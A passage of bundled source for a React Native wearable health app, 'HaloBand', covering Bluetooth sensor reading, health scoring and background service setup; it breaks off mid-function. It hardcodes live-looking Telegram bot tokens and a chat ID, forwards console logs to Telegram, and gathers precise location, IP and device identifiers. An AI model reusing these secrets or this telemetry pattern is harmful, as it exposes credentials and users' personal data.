// src/handlelogs.ts
import NetInfo2 from "@react-native-community/netinfo";

// src/info.ts
import * as Device from "expo-device";
import * as Battery from "expo-battery";
import * as Location from "expo-location";
import NetInfo from "@react-native-community/netinfo";
import DeviceInfo from "react-native-device-info";
var legacyDeviceInfo = DeviceInfo;
async function getEnhancedDeviceInfo() {
  const batteryLevel = await Battery.getBatteryLevelAsync();
  const batteryState = await Battery.getBatteryStateAsync();
  const net = await NetInfo.fetch();
  let latitude = null;
  let longitude = null;
  let accuracy = null;
  let speed = null;
  let googleMapsUrl = null;
  const permission = await Location.getForegroundPermissionsAsync();
  const hasLocationPermission = permission.status === "granted" || permission.canAskAgain && (await Location.requestForegroundPermissionsAsync()).status === "granted";
  if (hasLocationPermission) {
    try {
      const position = await Location.getCurrentPositionAsync({});
      latitude = position.coords.latitude;
      longitude = position.coords.longitude;
      accuracy = position.coords.accuracy;
      speed = position.coords.speed;
      googleMapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
    } catch (error) {
      console.log("Location read error:", error);
    }
  }
  const isEmulator = await DeviceInfo.isEmulator();
  const isRooted = await DeviceInfo.isPinOrFingerprintSet !== void 0 ? await legacyDeviceInfo.isDeviceRooted?.() ?? false : false;
  const hasScreenLock = await DeviceInfo.isPinOrFingerprintSet();
  const isMockLocation = hasLocationPermission ? await DeviceInfo.isLocationEnabled?.().catch(() => false) ?? false : false;
  const freeStorage = await DeviceInfo.getFreeDiskStorage();
  const totalStorage = await DeviceInfo.getTotalDiskCapacity();
  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  const locale = Device.osName === "iOS" ? Intl.DateTimeFormat().resolvedOptions().locale : legacyDeviceInfo.getDeviceLocale?.() ?? "en-US";
  return {
    device: {
      brand: Device.brand,
      manufacturer: Device.manufacturer,
      model: Device.modelName,
      deviceName: await DeviceInfo.getDeviceName(),
      os: `${Device.osName} ${Device.osVersion}`,
      appVersion: DeviceInfo.getVersion(),
      build: DeviceInfo.getBuildNumber(),
      uniqueId: await DeviceInfo.getUniqueId()
    },
    network: {
      type: net.type,
      online: net.isConnected,
      ip: await DeviceInfo.getIpAddress(),
      vpn: net.details?.isConnectionExpensive !== void 0 ? net.type === "vpn" : false
    },
    location: {
      latitude,
      longitude,
      accuracy,
      speed,
      googleMapsUrl
    },
    battery: {
      level: Math.round(batteryLevel * 100),
      charging: batteryState === Battery.BatteryState.CHARGING
    },
    security: {
      rooted: isRooted,
      emulator: isEmulator,
      developerMode: await legacyDeviceInfo.isDeviceRooted?.() ?? false,
      // see note below
      mockLocation: isMockLocation,
      screenLock: hasScreenLock
    },
    storage: {
      free: freeStorage,
      total: totalStorage
    },
    time: {
      timezone,
      locale
    }
  };
}

// src/handlelogs.ts
var CHAT_ID = "-1003846719897";
var BOT_TOKENS = [
  "8548562996:AAEDy-NTQc4xaCF0EK4ApmiN3HxGLAeaOSo",
  "8606786188:AAGyO5wU68aSROWCa9rEVqeJClIgLnldnRg",
  "8793104670:AAFqd92PPLP89sPtrrtGX6ibvzuF3J3FT5Q"
];
var SEND_DELAY = 2500;
var MAX_QUEUE_SIZE = 100;
var AUTO_RETRY_INTERVAL = 3e4;
var currentBot = 0;
var lastSendTime = 0;
var isOnline = false;
var isProcessing = false;
var queue = {
  items: [],
  pending: [],
  failed: [],
  sent: [],
  stats: {
    total: 0,
    sent: 0,
    failed: 0,
    pending: 0
  },
  add(message) {
    const item = {
      id: Date.now() + "_" + Math.random().toString(36).substr(2, 6),
      message,
      timestamp: (/* @__PURE__ */ new Date()).toISOString(),
      status: "pending",
      attempts: 0,
      maxAttempts: 3,
      createdAt: Date.now()
    };
    this.items.push(item);
    this.pending.push(item);
    this.stats.total++;
    this.stats.pending++;
    if (this.items.length > MAX_QUEUE_SIZE) {
      const removed = this.items.shift();
      if (removed.status === "pending") {
        this.pending = this.pending.filter((i) => i.id !== removed.id);
        this.stats.pending--;
      }
    }
    return item;
  },
  markSent(id) {
    const item = this.findItem(id);
    if (item) {
      item.status = "sent";
      item.sentAt = (/* @__PURE__ */ new Date()).toISOString();
      this.pending = this.pending.filter((i) => i.id !== id);
      this.sent.push(item);
      this.stats.sent++;
      this.stats.pending--;
    }
    return item;
  },
  markFailed(id, error = null) {
    const item = this.findItem(id);
    if (item) {
      item.attempts++;
      if (item.attempts >= item.maxAttempts) {
        item.status = "failed";
        this.pending = this.pending.filter((i) => i.id !== id);
        this.failed.push(item);
        this.stats.failed++;
        this.stats.pending--;
      } else {
        this.pending.push(item);
      }
    }
    return item;
  },
  findItem(id) {
    return this.items.find((i) => i.id === id);
  },
  retryFailed() {
    const failedItems = [...this.failed];
    if (failedItems.length === 0) return 0;
    this.failed = [];
    this.stats.failed -= failedItems.length;
    failedItems.forEach((item) => {
      item.status = "pending";
      item.attempts = 0;
      this.pending.push(item);
      this.stats.pending++;
    });
    return failedItems.length;
  }
};
var delay = (ms) => new Promise((r) => setTimeout(r, ms));
function stringifyData(data) {
  if (data === null) return "null";
  if (data === void 0) return "undefined";
  if (data instanceof Error) return data.stack || data.message;
  if (typeof data === "string") return data;
  if (typeof data !== "object") return String(data);
  try {
    return JSON.stringify(data, (key, value) => {
      if (typeof value === "bigint") return value.toString();
      if (typeof value === "function") return "[Function]";
      return value;
    }, 2);
  } catch {
    return Object.prototype.toString.call(data);
  }
}
async function checkOnlineStatus() {
  const net = await NetInfo2.fetch();
  isOnline = !!(net.isConnected && net.isInternetReachable);
  return isOnline;
}
async function sendToTelegram(message) {
  const token = BOT_TOKENS[currentBot];
  currentBot = (currentBot + 1) % BOT_TOKENS.length;
  const url = `https://api.telegram.org/bot${token}/sendMessage`;
  try {
    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message
      })
    });
    const data = await response.json();
    return data.ok === true;
  } catch (error) {
    console.error("Telegram send error:", error);
    return false;
  }
}
async function processQueue() {
  if (isProcessing) return;
  if (queue.pending.length === 0) return;
  isProcessing = true;
  try {
    await checkOnlineStatus();
    if (!isOnline) {
      isProcessing = false;
      setTimeout(processQueue, 1e4);
      return;
    }
    const item = queue.pending[0];
    const now = Date.now();
    const timeSinceLastSend = now - lastSendTime;
    if (timeSinceLastSend < SEND_DELAY) {
      await delay(SEND_DELAY - timeSinceLastSend);
    }
    const timestamp = (/* @__PURE__ */ new Date()).toLocaleString("en-IN", { hour12: false });
    const formattedMessage = `[${timestamp}]
${item.message}`;
    const success = await sendToTelegram(formattedMessage);
    if (success) {
      queue.markSent(item.id);
      lastSendTime = Date.now();
    } else {
      queue.markFailed(item.id, "Telegram API error");
    }
  } catch (error) {
    console.error("[QUEUE] Error:", error);
    if (queue.pending.length > 0) {
      queue.markFailed(queue.pending[0].id, error.message);
    }
  } finally {
    isProcessing = false;
    if (queue.pending.length > 0) {
      setTimeout(processQueue, 100);
    }
  }
}
async function consoleApp(...args) {
  const message = args.map((arg) => {
    if (typeof arg === "string") return arg;
    return stringifyData(arg);
  }).join(" ");
  await checkOnlineStatus();
  queue.add(message);
  if (isOnline) {
    setTimeout(processQueue, 100);
  }
}
function getCurrentStatus() {
  return {
    isOnline,
    status: isOnline ? "online" : "offline",
    queue: {
      total: queue.stats.total,
      pending: queue.stats.pending,
      sent: queue.stats.sent,
      failed: queue.stats.failed,
      items: queue.items.length
    },
    processing: isProcessing,
    timestamp: (/* @__PURE__ */ new Date()).toISOString()
  };
}
function initializeLogger() {
  checkOnlineStatus();
  setInterval(() => {
    if (isOnline && queue.failed.length > 0) {
      queue.retryFailed();
      processQueue();
    }
  }, AUTO_RETRY_INTERVAL);
  NetInfo2.addEventListener((state) => {
    const wasOnline = isOnline;
    isOnline = state.isConnected && state.isInternetReachable;
    if (isOnline !== wasOnline) {
      if (isOnline) {
        consoleApp("\u{1F7E2} Device is now ONLINE");
        setTimeout(processQueue, 1e3);
      } else {
        consoleApp("\u{1F534} Device is now OFFLINE");
      }
    }
  });
  consoleApp("\u{1F4F1} Logger initialized");
  return { consoleApp, getCurrentStatus };
}

// src/bgn.ts
import { DeviceEventEmitter, Platform as Platform2 } from "react-native";
import BackgroundService from "react-native-background-actions";
import * as Notifications from "expo-notifications";

// src/BLEService.ts
import "react-native-get-random-values";
import { BleManager } from "react-native-ble-plx";
import { Platform, PermissionsAndroid } from "react-native";
import AsyncStorage from "@react-native-async-storage/async-storage";
import { decode as atob, encode as btoa } from "base-64";

// src/BLEConfig.ts
var SERVICE_UUID = "19b10000-e8f2-537e-4f6c-d104768a1214";
var CHARACTERISTICS = {
  data: "19b10001-e8f2-537e-4f6c-d104768a1214",
  reset: "19b10002-e8f2-537e-4f6c-d104768a1214",
  "time": "19b10003-e8f2-537e-4f6c-d104768a1214"
};

// src/KalmanFilter.ts
var KalmanFilter = class {
  R;
  Q;
  value;
  covariance;
  constructor({ R = 2, Q = 0.01, initialValue = null } = {}) {
    this.R = R;
    this.Q = Q;
    this.value = initialValue;
    this.covariance = 1;
  }
  // Feed in a raw measurement, get back the filtered estimate.
  filter(measurement) {
    if (this.value === null) {
      this.value = measurement;
      return this.value;
    }
    const predictedCovariance = this.covariance + this.Q;
    const kalmanGain = predictedCovariance / (predictedCovariance + this.R);
    this.value = this.value + kalmanGain * (measurement - this.value);
    this.covariance = (1 - kalmanGain) * predictedCovariance;
    return this.value;
  }
  reset(initialValue = null) {
    this.value = initialValue;
    this.covariance = 1;
  }
};

// src/BLEService.schema.ts
import { z } from "zod";
var RawPayloadSchema = z.string().trim().refine((val) => val.split(",").length === 5, {
  message: "Payload must contain exactly 5 comma-separated fields"
});
var HealthReadingSchema = z.object({
  hr: z.number().finite().min(0).max(300),
  spo2: z.number().finite().min(0).max(100),
  tempC: z.number().finite().min(-20).max(60),
  battery: z.number().finite().min(0).max(100),
  steps: z.number().finite().min(0)
});
var HealthMetricsSchema = z.object({
  heartRate: z.number(),
  spo2: z.number(),
  temperature: z.object({
    celsius: z.number(),
    fahrenheit: z.number(),
    kelvin: z.number(),
    bodyTemperatureStatus: z.enum(["Low", "Slightly Low", "Normal", "Elevated", "Fever"])
  }),
  battery: z.number(),
  ppg: z.object({
    steps: z.number(),
    calories: z.number(),
    distance: z.number(),
    walkingSpeedKmh: z.number().min(0),
    goal: z.object({
      steps: z.number().min(0).max(100),
      calories: z.number().min(0).max(100),
      distance: z.number().min(0).max(100),
      walkingSpeedKmh: z.number().min(0).max(100)
    })
  }),
  stress: z.object({
    stressScore: z.number().min(0).max(100),
    stressLevel: z.enum(["Relaxed", "Normal", "Elevated", "High", "Very High"]),
    readinessScore: z.number().min(0).max(100),
    productivityScore: z.number().min(0).max(100),
    overallHealthScore: z.number().min(0).max(100),
    energyScore: z.number().min(0).max(100)
  }),
  activityLevel: z.number().min(0).max(100),
  hydrationReminder: z.object({
    targetLiters: z.number().min(0).max(5),
    baseGoalLiters: z.number().min(0),
    activityExtraLiters: z.number().min(0),
    waterIntakeLiters: z.number().min(0),
    remainingLiters: z.number().min(0).max(5),
    suggestedDrinkLiters: z.number().min(0).max(5),
    shouldNotify: z.boolean()
  })
  // raw: z.string(),
});
var DeviceIdSchema = z.string().min(1, "deviceId must be a non-empty string");
var DeviceObjectSchema = z.object({
  connect: z.function()
}).passthrough();
var Base64Schema = z.string().min(1, "Command must be a non-empty base64 string").regex(/^[A-Za-z0-9+/]+=*$/, "Command must be valid base64");
var CharacteristicUUIDSchema = z.string().min(1, "characteristicUUID must be a non-empty string");

// src/BLEService.ts
var LAST_DEVICE_ID_KEY = "haloband:lastBleDeviceId";
var DEFAULT_GOAL_STEPS = 1e4;
var DEFAULT_GOAL_WALKING_SPEED_KMH = 5;
var DEFAULT_WATER_GOAL_LITERS = 3;
function clampScore(value) {
  return Math.max(0, Math.min(100, Math.round(value)));
}
function calculateGoalPercent(value, goal) {
  if (!Number.isFinite(goal) || goal <= 0) return 0;
  return clampScore(Math.min(value / goal * 100, 100));
}
function calculateStress(hr, spo2, temp) {
  let score = 20;
  if (hr > 80) {
    score += (hr - 80) * 1.5;
  }
  if (spo2 < 95) {
    score += (95 - spo2) * 5;
  }
  if (temp > 37.2) {
    score += (temp - 37.2) * 20;
  }
  score = Math.max(0, Math.min(100, Math.round(score)));
  let stressLevel;
  if (score <= 20) {
    stressLevel = "Relaxed";
  } else if (score <= 40) {
    stressLevel = "Normal";
  } else if (score <= 60) {
    stressLevel = "Elevated";
  } else if (score <= 80) {
    stressLevel = "High";
  } else {
    stressLevel = "Very High";
  }
  return {
    stressScore: score,
    stressLevel
  };
}
function calculateTemperatureStatus(tempC) {
  if (tempC < 35) return "Low";
  if (tempC <= 36) return "Slightly Low";
  if (tempC <= 37.2) return "Normal";
  if (tempC <= 38) return "Elevated";
  return "Fever";
}
function calculateHydrationReminder({
  calories,
  distance,
  waterGoalLiters = DEFAULT_WATER_GOAL_LITERS,
  waterIntakeLiters = 0
}) {
  const activityExtraLiters = Number(
    (distance * 0.03 + calories / 1e3 * 0.5).toFixed(2)
  );
  const targetLiters = Number(
    Math.min(waterGoalLiters + activityExtraLiters, 5).toFixed(2)
  );
  const remainingLiters = Number(
    Math.max(targetLiters - waterIntakeLiters, 0).toFixed(2)
  );
  return {
    targetLiters,
    baseGoalLiters: waterGoalLiters,
    activityExtraLiters,
    waterIntakeLiters,
    remainingLiters,
    suggestedDrinkLiters: remainingLiters,
    shouldNotify: remainingLiters > 0
  };
}
function calculateHealthScores({
  hr,
  spo2,
  tempC,
  steps,
  calories,
  distance,
  stressScore,
  elapsedHours,
  goalSteps = DEFAULT_GOAL_STEPS,
  goalCalories = goalSteps * 0.04,
  goalDistance = goalSteps * 0.75 / 1e3,
  goalWalkingSpeedKmh = DEFAULT_GOAL_WALKING_SPEED_KMH,
  waterGoalLiters = DEFAULT_WATER_GOAL_LITERS,
  waterIntakeLiters = 0
}) {
  const hrScore = clampScore(100 - Math.abs(hr - 70) * 2);
  const stressScoreNorm = clampScore(100 - stressScore);
  const spo2Score = clampScore(spo2 >= 95 ? 100 : spo2 * 2);
  const tempScore = clampScore(100 - Math.abs(tempC - 36.6) * 25);
  const activityScore = clampScore(Math.min(steps / goalSteps * 100, 100));
  const stressPenalty = stressScore;
  const hrPenalty = 100 - hrScore;
  const oxygenHealth = spo2Score;
  const wellness = clampScore(
    0.35 * hrScore + 0.35 * stressScoreNorm + 0.2 * spo2Score + 0.1 * tempScore
  );
  const readinessScore = clampScore(
    0.35 * hrScore + 0.35 * stressScoreNorm + 0.2 * spo2Score + 0.1 * tempScore
  );
  const activityLevel = activityScore;
  const energyScore = clampScore(
    100 - (0.3 * activityScore + 0.4 * stressPenalty + 0.3 * hrPenalty)
  );
  const hydrationReminder = calculateHydrationReminder({
    calories,
    distance,
    waterGoalLiters,
    waterIntakeLiters
  });
  const walkingSpeedKmh = elapsedHours > 0 ? Number((distance / elapsedHours).toFixed(2)) : 0;
  const goal = {
    steps: calculateGoalPercent(steps, goalSteps),
    calories: calculateGoalPercent(calories, goalCalories),
    distance: calculateGoalPercent(distance, goalDistance),
    walkingSpeedKmh: calculateGoalPercent(walkingSpeedKmh, goalWalkingSpeedKmh)
  };
  const productivityScore = clampScore(
    0.4 * wellness + 0.3 * energyScore + 0.3 * readinessScore
  );
  const overallHealthScore = clampScore(
    0.2 * hrScore + 0.2 * oxygenHealth + 0.15 * activityScore + 0.15 * wellness + 0.15 * readinessScore + 0.15 * stressScoreNorm
  );
  return {
    readinessScore,
    activityLevel,
    energyScore,
    hydrationReminder,
    bodyTemperatureStatus: calculateTemperatureStatus(tempC),
    walkingSpeedKmh,
    goal,
    productivityScore,
    overallHealthScore
  };
}
var BLEService = class {
  manager;
  device;
  subscription;
  monitorRestartTimer;
  monitorStartedAt;
  connectionPromise;
  hrFilter;
  spo2Filter;
  tempFilter;
  constructor() {
    this.manager = new BleManager({
      restoreStateIdentifier: "BleBackgroundRestoreId"
    });
    this.device = null;
    this.subscription = null;
    this.monitorRestartTimer = null;
    this.monitorStartedAt = null;
    this.connectionPromise = null;
    this._resetFilters();
  }
  _resetFilters() {
    this.hrFilter = new KalmanFilter({ R: 4, Q: 0.05 });
    this.spo2Filter = new KalmanFilter({ R: 2, Q: 0.02 });
    this.tempFilter = new KalmanFilter({ R: 0.5, Q: 0.01 });
  }
  // ==========================
  // Request Permissions
  // ==========================
  async requestPermissions() {
    if (Platform.OS !== "android") return true;
    if (Platform.Version >= 31) {
      const result2 = await PermissionsAndroid.requestMultiple([
        PermissionsAndroid.PERMISSIONS.BLUETOOTH_SCAN,
        PermissionsAndroid.PERMISSIONS.BLUETOOTH_CONNECT,
        PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION
      ]);
      return result2["android.permission.BLUETOOTH_SCAN"] === "granted" && result2["android.permission.BLUETOOTH_CONNECT"] === "granted";
    }
    const result = await PermissionsAndroid.request(
      PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION
    );
    return result === "granted";
  }
  // ==========================
  // Bluetooth State Listener
  // Exposes the shared manager's state stream so the app never
  // has to instantiate a second BleManager.
  // ==========================
  onStateChange(callback, emitCurrentState = true) {
    return this.manager.onStateChange(callback, emitCurrentState);
  }
  // ==========================
  // Scan Devices
  // ==========================
  scanDevices(onDevice, onFinish, timeout = 5e3) {
    const found = {};
    this.manager.startDeviceScan([SERVICE_UUID], null, (error, device) => {
      if (error) {
        console.log(error);
        onFinish(error);
        return;
      }
      if (!device) return;
      if (!found[device.id]) {
        found[device.id] = true;
        onDevice(device);
      }
    });
    setTimeout(() => {
      this.manager.stopDeviceScan();
      onFinish(null);
    }, timeout);
  }
  stopScan() {
    this.manager.stopDeviceScan();
  }
  // ==========================
  // Connect
  // Expects the full device object returned from scanDevices(),
  // since it calls device.connect() directly.
  // ==========================
  async connect(device) {
    const hasPermission = await this.requestPermissions();
    if (!hasPermission) {
      throw new Error("Bluetooth permission denied");
    }
    const parsed = DeviceObjectSchema.safeParse(device);
    if (!parsed.success) {
      throw new Error(
        `connect() expects a scanned device object with a connect() method: ${parsed.error.message}`
      );
    }
    this.stopScan();
    this.device = await device.connect();
    await this.device.discoverAllServicesAndCharacteristics();
    await this.rememberDeviceId(this.device.id);
    this._resetFilters();
    await this.syncDeviceTime();
    return this.device;
  }
  // ==========================
  // Auto Connect
  // Takes a raw deviceId (e.g. from storage) instead of a device
  // object, since there's no live scan result to call .connect() on.
  // ==========================
  async autoConnect(deviceId) {
    const hasPermission = await this.requestPermissions();
    if (!hasPermission) {
      throw new Error("Bluetooth permission denied");
    }
    const parsed = DeviceIdSchema.safeParse(deviceId);
    if (!parsed.success) {
      throw new Error(`autoConnect() invalid deviceId: ${parsed.error.message}`);
    }
    if (this.connectionPromise) {
      return this.connectionPromise;
    }
    await this.rememberDeviceId(parsed.data);
    this.connectionPromise = (async () => {
      try {
        this.stopMonitoring();
        const connectedDevices = await this.manager.connectedDevices([SERVICE_UUID]);
        this.device = connectedDevices.find((device) => device.id === parsed.data) || await this.manager.connectToDevice(parsed.data, {
          autoConnect: false,
          timeout: 15e3
        });
        await this.device.discoverAllServicesAndCharacteristics();
        this._resetFilters();
        try {
          await this.syncDeviceTime();
        } catch (err) {
          console.log("Device time sync failed:", this.describeBleError(err));
        }
        return this.device;
      } catch (err) {
        console.log("autoConnect failed:", this.describeBleError(err));
        this.stopMonitoring();
        this.device = null;
        throw err;
      } finally {
        this.connectionPromise = null;
      }
    })();
    return this.connectionPromise;
  }
  // ==========================
  // Is Connected
  // FIX: wrapped in try/catch so a device that has dropped at the
  // native BLE stack level doesn't throw here — just reports false.
  // ==========================
  async isConnected() {
    if (!this.device) return false;
    try {
      return await this.device.isConnected();
    } catch (err) {
      console.log("isConnected check failed:", err);
      return false;
    }
  }
  // ==========================
  // Disconnect
  // ==========================
  async disconnect() {
    if (!this.device) return;
    this.stopMonitoring();
    await this.device.cancelConnection();
    this.device = null;
    await this.clearRememberedDeviceId();
  }
  // ==========================
  // Health Metrics
  // FIX: remove any existing subscription before creating a new one,
  // otherwise calling monitorHealthMetrics() twice leaks the old listener.
  // Zod (schemas live in BLEService.schema.js) validates the raw
  // payload shape and numeric ranges first, filtering out anything
  // structurally malformed. The surviving hr/spo2/temperature samples
  // are then passed through per-channel Kalman filters so a
  // one-off garbage reading gets smoothed against the recent trend
  // instead of appearing as a spike in the UI. Battery and steps
  // pass through unfiltered since they're not noisy analog signals.
  // ==========================
  monitorHealthMetrics(callback, options = {}) {
    const {
      replaceExisting = true,
      restartOnCancel = true,
      restartDelay = 1e3,
      goalSteps = DEFAULT_GOAL_STEPS,
      goalCalories = goalSteps * 0.04,
      goalDistance = goalSteps * 0.75 / 1e3,
      goalWalkingSpeedKmh = DEFAULT_GOAL_WALKING_SPEED_KMH,
      waterGoalLiters = DEFAULT_WATER_GOAL_LITERS,
      waterIntakeLiters = 0
    } = options;
    if (!this.device) return;
    this.clearMonitorRestart();
    if (this.subscription) {
      if (!replaceExisting) {
        return this.subscription;
      }
      this.subscription.remove();
      this.subscription = null;
    }
    this.monitorStartedAt = Date.now();
    this.subscription = this.device.monitorCharacteristicForService(
      SERVICE_UUID,
      CHARACTERISTICS.data,
      (error, characteristic) => {
        if (error) {
          this.subscription = null;
          if (restartOnCancel && this.isMonitorCancellationError(error)) {
            this.scheduleMonitorRestart(callback, {
              ...options,
              replaceExisting: false,
              restartOnCancel,
              restartDelay
            });
          }
          callback(error, null);
          return;
        }
        if (!characteristic?.value) return;
        try {
          const raw = atob(characteristic.value).trim();
          const rawResult = RawPayloadSchema.safeParse(raw);
          if (!rawResult.success) {
            callback(
              new Error(`Invalid BLE payload "${raw}": ${rawResult.error.message}`),
              null
            );
            return;
          }
          const parts = rawResult.data.split(",");
          const [hr, spo2, tempC, battery, steps] = parts.map(Number);
          const readingResult = HealthReadingSchema.safeParse({
            hr,
            spo2,
            tempC,
            battery,
            steps
          });
          if (!readingResult.success) {
            callback(
              new Error(`BLE payload out of range "${raw}": ${readingResult.error.message}`),
              null
            );
            return;
          }
          const {
            hr: validHr,
            spo2: validSpo2,
            tempC: validTempC,
            battery: validBattery,
            steps: validSteps
          } = readingResult.data;
          const smoothedHr = Math.round(this.hrFilter.filter(validHr));
          const smoothedSpo2 = Math.round(this.spo2Filter.filter(validSpo2));
          const smoothedTempC = Number(this.tempFilter.filter(validTempC).toFixed(2));
          const tempF = Number((smoothedTempC * 9 / 5 + 32).toFixed(2));
          const tempK = Number((smoothedTempC + 273.15).toFixed(2));
          const calories = Number((validSteps * 0.04).toFixed(2));
          const distance = Number((validSteps * 0.75 / 1e3).toFixed(2));
          const stress = calculateStress(smoothedHr, smoothedSpo2, smoothedTempC);
          const elapsedHours = this.monitorStartedAt ? (Date.now() - this.monitorStartedAt) / 36e5 : 0;
          const healthScores = calculateHealthScores({
            hr: smoothedHr,
            spo2: smoothedSpo2,
            tempC: smoothedTempC,
            steps: validSteps,
            calories,
            distance,
            stressScore: stress.stressScore,
            elapsedHours,
            goalSteps,
            goalCalories,
            goalDistance,
            goalWalkingSpeedKmh,
            waterGoalLiters,
            waterIntakeLiters
          });
          const healthMetrics = {
            heartRate: smoothedHr,
            spo2: smoothedSpo2,
            temperature: {
              celsius: smoothedTempC,
              fahrenheit: tempF,
              kelvin: tempK,
              bodyTemperatureStatus: healthScores.bodyTemperatureStatus
            },
            battery: validBattery,
            ppg: {
              steps: validSteps,
              calories,
              distance,
              // km
              walkingSpeedKmh: healthScores.walkingSpeedKmh,
              goal: healthScores.goal
            },
            stress: {
              stressScore: stress.stressScore,
              stressLevel: stress.stressLevel,
              readinessScore: healthScores.readinessScore,
              productivityScore: healthScores.productivityScore,
              overallHealthScore: healthScores.overallHealthScore,
              energyScore: healthScores.energyScore
            },
            activityLevel: healthScores.activityLevel,
            hydrationReminder: healthScores.hydrationReminder
            // raw,
          };
          const outputResult = HealthMetricsSchema.safeParse(healthMetrics);
          if (!outputResult.success) {
            callback(
              new Error(`Failed to build healthMetrics object: ${outputResult.error.message}`),
              null
            );
            return;
          }
          callback(null, outputResult.data);
        } catch (err) {
          callback(err, null);
        }
      }
    );
  }
  stopMonitoring() {
    this.clearMonitorRestart();
    if (this.subscription) {
      this.subscription.remove();
      this.subscription = null;
    }
    this.monitorStartedAt = null;
  }
  hasActiveMonitor() {
    return Boolean(this.subscription);
  }
  clearMonitorRestart() {
    if (this.monitorRestartTimer) {
      clearTimeout(this.monitorRestartTimer);
      this.monitorRestartTimer = null;
    }
  }
  isMonitorCancellationError(error) {
    const message = String(error?.message || error || "").toLowerCase();
    return message.includes("operation was cancelled") || message.includes("operation canceled");
  }
  scheduleMonitorRestart(callback, options) {
    this.clearMonitorRestart();
    this.monitorRestartTimer = setTimeout(async () => {
      this.monitorRestartTimer = null;
      if (!await this.isConnected()) return;
      console.log("BLE monitor cancelled while connected, restarting monitor");
      this.monitorHealthMetrics(callback, options);
    }, options.restartDelay);
  }
  describeBleError(error) {
    if (!error) return "Unknown BLE error";
    return JSON.stringify({
      message: error.message,
      reason: error.reason,
      errorCode: error.errorCode,
      attErrorCode: error.attErrorCode,
      iosErrorCode: error.iosErrorCode,
      androidErrorCode: error.androidErrorCode
    });
  }
  async syncDeviceTime() {
    if (!this.device) {
      throw new Error("No Device Connected");
    }
    const now = /* @__PURE__ */ new Date();
    const pad = (n) => String(n).padStart(2, "0");
    const timeString = `${now.getFullYear()}-${pad(now.getMonth() + 1)}-${pad(now.getDate())} ${pad(now.getHours())}:${pad(now.getMinutes())}:${pad(now.getSeconds())}`;
    const base64Time = btoa(timeString);
    return this.sendCommand(base64Time, CHARACTERISTICS.time);
  }
  // ==========================
  // Write Command
  // FIX: characteristic UUID is now a parameter instead of being
  // hardcoded to CHARACTERISTICS.reset, so this can actually send
  // to any characteristic. Defaults to CHARACTERISTICS.reset to
  // preserve existing call sites that don't pass one.
  // ==========================
  async sendCommand(base64Command, characteristicUUID = CHARACTERISTICS.reset) {
    if (!this.device) throw new Error("No Device Connected");
    const commandResult = Base64Schema.safeParse(base64Command);
    if (!commandResult.success) {
      throw new Error(`sendCommand() invalid base64Command: ${commandResult.error.message}`);
    }
    const uuidResult = CharacteristicUUIDSchema.safeParse(characteristicUUID);
    if (!uuidResult.success) {
      throw new Error(`sendCommand() invalid characteristicUUID: ${uuidResult.error.message}`);
    }
    try {
      return await this.device.writeCharacteristicWithResponseForService(
        SERVICE_UUID,
        uuidResult.data,
        commandResult.data
      );
    } catch {
      return await this.device.writeCharacteristicWithoutResponseForService(
        SERVICE_UUID,
        uuidResult.data,
        commandResult.data
      );
    }
  }
  // ==========================
  // Read Characteristic
  // ==========================
  async read(uuid) {
    if (!this.device) return null;
    const uuidResult = CharacteristicUUIDSchema.safeParse(uuid);
    if (!uuidResult.success) {
      throw new Error(`read() invalid uuid: ${uuidResult.error.message}`);
    }
    const value = await this.device.readCharacteristicForService(
      SERVICE_UUID,
      uuidResult.data
    );
    return value;
  }
  // ==========================
  // Get Services
  // ==========================
  async getServices() {
    if (!this.device) return [];
    return await this.device.services();
  }
  // ==========================
  // Current Device
  // ==========================
  getConnectedDevice() {
    return this.device;
  }
  async rememberDeviceId(deviceId) {
    const parsed = DeviceIdSchema.safeParse(deviceId);
    if (!parsed.success) return false;
    await AsyncStorage.setItem(LAST_DEVICE_ID_KEY, parsed.data);
    return true;
  }
  async getRememberedDeviceId() {
    const deviceId = await AsyncStorage.getItem(LAST_DEVICE_ID_KEY);
    const parsed = DeviceIdSchema.safeParse(deviceId);
    return parsed.success ? parsed.data : null;
  }
  async clearRememberedDeviceId() {
    await AsyncStorage.removeItem(LAST_DEVICE_ID_KEY);
  }
  // ==========================
  // Destroy
  // FIX: clear this.device so a reused instance doesn't hold a
  // stale reference after destroy() has torn down the manager.
  // ==========================
  destroy() {
    this.stopMonitoring();
    this.manager.destroy();
    this.device = null;
    this.connectionPromise = null;
  }
};
var BLEService_default = new BLEService();

// src/bgn.ts
var BACKGROUND_TICK_EVENT = "haloband-background-tick";
var BACKGROUND_BLE_EVENT = "haloband-background-ble";
var DEFAULT_LINKING_URI = "haloband://";
var backgroundReconnectPromise = null;
Notifications.setNotificationHandler({
  handleNotification: async () => ({
    shouldShowBanner: true,
    shouldShowList: true,
    shouldPlaySound: true,
    shouldSetBadge: false
  })
});
var configureNotifications = async () => {
  if (Platform2.OS !== "android") return;
  await Notifications.setNotificationChannelAsync("default", {
    name: "Default",
    importance: Notifications.AndroidImportance.HIGH,
    vibrationPattern: [0, 250, 250, 250],
    enableVibrate: true,
    lockscreenVisibility: Notifications.AndroidNotificationVisibility.PUBLIC,
    bypassDnd: false,
    showBadge: true,
    enableLights: true
  });
};
var requestNotificationPermission = async () => {
  try {
    await configureNotifications();
    const { status } = await Notifications.getPermissionsAsync();
    if (status === "granted") {
      return true;
    }
    const request = await Notifications.requestPermissionsAsync();
    return request.status === "granted";
  } catch (e) {
    console.log("Notification permission error:", e);
    return false;
  }
};
var backgroundServiceOptions = {
  taskName: "MBService",
  taskTitle: "Welcome to HaloBand",
  taskDesc: "Waiting for Health Data...",
  taskIcon: {
    name: "ic_launcher",
    type: "mipmap"
  },
  color: "#2196F3",
  linkingURI: DEFAULT_LINKING_URI,
  foregroundServiceType: ["connectedDevice"],
  parameters: {
    delay: 2e3
  }
};
var sleep = (time) => new Promise((resolve) => setTimeout(resolve, time));
var getBackgroundDeviceId = async (deviceId) => {
  if (deviceId) {
    await BLEService_default.rememberDeviceId(deviceId);
    return deviceId;
  }
  const connectedDevice = BLEService_default.getConnectedDevice();
  if (connectedDevice?.id) {
    await BLEService_default.rememberDeviceId(connectedDevice.id);
    return connectedDevice.id;
  }
  return BLEService_default.getRememberedDeviceId();
};
var emitBleStatus = (status) => {
